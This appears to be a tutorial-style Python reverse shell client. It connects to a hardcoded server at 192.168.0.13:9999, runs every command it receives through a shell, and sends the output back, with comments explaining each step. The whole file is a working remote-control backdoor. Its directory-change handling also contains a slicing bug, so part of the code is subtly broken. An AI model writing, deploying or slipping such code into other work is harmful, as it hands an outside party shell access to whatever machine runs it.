'''
functions:
try and connect to our server
wait for our instructions
receives the instructions and run them
take the resultl and send them back to the server
'''

import socket
import os                                   # without os and subprocess we cannot execute instructions that client.py will receive
import subprocess

s = socket.socket()
host = '192.168.0.13'                       # IP of server
port = 9999                               # server and client port# must be same

s.connect((host,port))                     # server goes socket>bind>listen>accept    client is socket>connect

while True:                                 # don't want to close after just one instruction
    data = s.recv(1024)                      # buffer size 1024
    if data[:2].decode('utf-8') == 'cd':      # decode from byte to str, takes first 2 characters and check if they are 'cd'
        os.chdir(data[:3].decode('utf-8'))

    if len(data) > 0:                       # check if something has been entered
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)       #use subprocess module to open cmd prompt, shell=True allows use to access/use shell cmds,  stdout is output after we type a command
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)